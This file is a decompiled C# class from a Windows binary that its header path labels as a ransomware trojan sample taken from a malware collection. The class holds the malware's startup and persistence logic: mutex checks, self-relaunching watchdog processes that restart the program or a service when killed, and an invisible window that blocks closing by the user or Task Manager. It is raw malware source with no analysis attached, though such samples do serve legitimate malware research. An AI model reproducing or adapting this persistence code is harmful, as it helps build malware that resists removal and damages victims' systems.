// Decompiled with JetBrains decompiler
// Type: ns8.Class32
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: B1CE77B7-43A4-4D0C-BE92-E14F659185D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-6c6f9efcfc88f15c0833fd15baa6378ada9b6c75c74c4b19262169e44af740c0.exe

using ns0;
using ns2;
using ns3;
using ns5;
using ns6;
using ns9;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;

namespace ns8
{
  internal sealed class Class32
  {
    private static Random random_0 = new Random();
    private static bool bool_0 = false;
    private static bool bool_1 = false;
    private static bool? nullable_0;
    private static int? nullable_1;
    private static int? nullable_2;
    private static string string_0;
    private static Enum0 enum0_0 = Enum0.const_0;
    private static Mutex mutex_0;

    public static void smethod_0(string[] string_1)
    {
      if (string_1 != null && string_1.Length > 0)
        Class32.smethod_17(string_1);
      switch (Class32.enum0_0)
      {
        case Enum0.const_1:
          Class32.smethod_15();
          break;
        case Enum0.const_2:
          Class32.smethod_14();
          break;
        case Enum0.const_4:
          Class32.smethod_16();
          break;
        default:
          if (!Class32.smethod_5() && !Class18.smethod_17())
          {
            if (!Class18.smethod_6())
            {
              if (!Class18.smethod_8() && !Class32.smethod_11() && !Class32.smethod_13(Class34.string_1))
              {
                Class18.smethod_7(true);
                Class18.smethod_18(false);
              }
            }
            else
              Class18.smethod_7(false);
          }
          Class18.smethod_12(string_1);
          if (Class32.smethod_13(Class34.smethod_0()))
          {
            Class32.smethod_18();
            break;
          }
          if (!Class32.smethod_11() && Class32.smethod_3())
            Class32.smethod_10();
          Class32.smethod_6();
          Class32.smethod_18();
          if (Class32.smethod_5())
            Class32.smethod_8();
          if (Class32.smethod_11())
            Class32.smethod_4();
          if (!Class32.smethod_3() && Class32.smethod_7())
            Class32.smethod_2();
          Class32.smethod_19();
          Class32.smethod_1();
          break;
      }
    }

    public static void smethod_1()
    {
      Class13.smethod_0();
      new Delegate5(Class44.smethod_0).BeginInvoke((AsyncCallback) null, (object) null);
      new Delegate5(Class18.smethod_0).BeginInvoke((AsyncCallback) null, (object) null);
      new Delegate5(Class8.smethod_0).BeginInvoke((AsyncCallback) null, (object) null);
      Class32.smethod_12();
    }

    private static void smethod_2()
    {
      try
      {
        List<string> stringList = Class18.smethod_5();
        string fileName;
        if (stringList.Count > 1)
        {
          int index = Class32.random_0.Next(0, stringList.Count - 1);
          fileName = stringList[index];
        }
        else
        {
          if (stringList.Count != 1)
            return;
          fileName = stringList[0];
        }
        Process.Start(fileName);
        Environment.Exit(0);
      }
      catch
      {
      }
    }

    private static bool smethod_3() => Class18.smethod_11(Application.ExecutablePath);

    private static void smethod_4()
    {
      if (!Class32.bool_1)
        return;
      Application.Exit();
    }

    private static bool smethod_5() => Class9.smethod_1();

    private static void smethod_6() => Class18.smethod_4();

    private static bool smethod_7() => Class18.smethod_10();

    private static void smethod_8()
    {
      try
      {
        if (!Class32.smethod_13(Class34.string_0))
        {
          Class32.smethod_20();
          Class9.smethod_2();
        }
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
      }
    }

    private static void smethod_9()
    {
      try
      {
        Class9.smethod_3(Class34.string_2);
      }
      catch (Exception ex)
      {
      }
    }

    private static void smethod_10()
    {
      try
      {
        Class9.smethod_0();
        Thread.Sleep(100);
        Class32.smethod_9();
      }
      catch (Exception ex)
      {
      }
    }

    private static bool smethod_11()
    {
      try
      {
        Class9.smethod_4(Class34.string_2, out Class32.bool_0, out Class32.bool_1);
      }
      catch (Exception ex)
      {
        return false;
      }
      return Class32.bool_0;
    }

    private static void smethod_12()
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Class32.Class33 class33_1 = new Class32.Class33();
      // ISSUE: variable of a compiler-generated type
      Class32.Class33 class33_2 = class33_1;
      Form form1 = new Form();
      form1.Location = new Point(-400, -400);
      form1.Opacity = 0.0;
      form1.FormBorderStyle = FormBorderStyle.None;
      form1.ShowIcon = false;
      form1.ShowInTaskbar = false;
      form1.Visible = false;
      form1.Text = "";
      Form form2 = form1;
      // ISSUE: reference to a compiler-generated field
      class33_2.form_0 = form2;
      // ISSUE: reference to a compiler-generated field
      class33_1.form_0.FormClosing += (FormClosingEventHandler) ((sender, e) =>
      {
        if (e.CloseReason != CloseReason.UserClosing && e.CloseReason != CloseReason.TaskManagerClosing)
          return;
        e.Cancel = true;
      });
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      class33_1.form_0.Shown += new EventHandler(class33_1.method_0);
      try
      {
        // ISSUE: reference to a compiler-generated field
        Application.Run(class33_1.form_0);
      }
      catch (Exception ex)
      {
        while (Class34.bool_0)
          Thread.Sleep(1000);
      }
    }

    private static bool smethod_13(string string_1)
    {
      try
      {
        Class32.mutex_0 = Mutex.OpenExisting(string_1);
        return true;
      }
      catch
      {
        try
        {
          Class32.mutex_0 = new Mutex(true, string_1);
        }
        catch (Exception ex)
        {
          return true;
        }
      }
      return false;
    }

    private static void smethod_14()
    {
      int processId = Class32.nullable_1 ?? -1;
      Process processById;
      try
      {
        processById = Process.GetProcessById(processId);
        if (processById == null)
          return;
      }
      catch (Exception ex)
      {
        return;
      }
      ProcessStartInfo startInfo;
      string fileName;
      try
      {
        startInfo = processById.StartInfo;
        fileName = processById.MainModule.FileName;
      }
      catch (Exception ex)
      {
        return;
      }
      try
      {
        processById.WaitForExit();
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (startInfo != null && !string.IsNullOrEmpty(startInfo.FileName))
          Process.Start(startInfo);
        else
          Process.Start(new ProcessStartInfo(fileName)
          {
            UseShellExecute = true
          });
      }
      catch (Exception ex)
      {
      }
    }

    private static void smethod_15()
    {
      int processId = Class32.nullable_2 ?? -1;
      Process processById;
      try
      {
        processById = Process.GetProcessById(processId);
        if (processById == null)
          return;
      }
      catch (Exception ex)
      {
        return;
      }
      try
      {
        processById.WaitForExit();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new ServiceController(Class32.string_0).Start();
      }
      catch (Exception ex)
      {
      }
    }

    private static void smethod_16()
    {
      Class18.smethod_9();
      Class18.smethod_16();
      bool? nullable0 = Class32.nullable_0;
      if ((!nullable0.GetValueOrDefault() ? 0 : (nullable0.HasValue ? 1 : 0)) == 0)
        return;
      Environment.Exit(0);
    }

    private static void smethod_17(string[] string_1)
    {
      if (string_1 == null)
        return;
      if (string_1.Length == 0)
        return;
      try
      {
        switch (string_1[0].ToLower())
        {
          case "rg":
            Class32.nullable_0 = new bool?(true);
            Class32.enum0_0 = Enum0.const_4;
            break;
          case "wm":
            int result1;
            if (!int.TryParse(string_1[1], out result1))
              break;
            Class32.nullable_1 = new int?(result1);
            Class32.enum0_0 = Enum0.const_2;
            break;
          case "ws":
            int result2;
            if (!int.TryParse(string_1[1], out result2) || string.IsNullOrEmpty(string_1[2]))
              break;
            Class32.nullable_2 = new int?(result2);
            Class32.string_0 = string_1[2];
            Class32.enum0_0 = Enum0.const_1;
            break;
        }
      }
      catch
      {
      }
    }

    private static void smethod_18()
    {
      ProcessStartInfo startInfo = new ProcessStartInfo(Application.ExecutablePath)
      {
        Arguments = "rg"
      };
      try
      {
        Process.Start(startInfo);
      }
      catch
      {
      }
    }

    private static void smethod_19()
    {
      string executablePath = Application.ExecutablePath;
      List<string> stringList = Class18.smethod_5();
      if (stringList.Count > 1)
      {
        int index = Class32.random_0.Next(0, stringList.Count - 1);
        executablePath = stringList[index];
      }
      Process currentProcess = Process.GetCurrentProcess();
      ProcessStartInfo startInfo = new ProcessStartInfo(executablePath)
      {
        Arguments = "wm " + (object) currentProcess.Id
      };
      try
      {
        Process.Start(startInfo);
      }
      catch
      {
      }
    }

    private static void smethod_20()
    {
      string executablePath = Application.ExecutablePath;
      List<string> stringList = Class18.smethod_5();
      if (stringList.Count > 1)
      {
        int index = Class32.random_0.Next(0, stringList.Count - 1);
        executablePath = stringList[index];
      }
      Process currentProcess = Process.GetCurrentProcess();
      ProcessStartInfo startInfo = new ProcessStartInfo(executablePath)
      {
        Arguments = "ws " + (object) currentProcess.Id + " " + Class34.string_2
      };
      try
      {
        Process.Start(startInfo);
      }
      catch
      {
      }
    }
  }
}
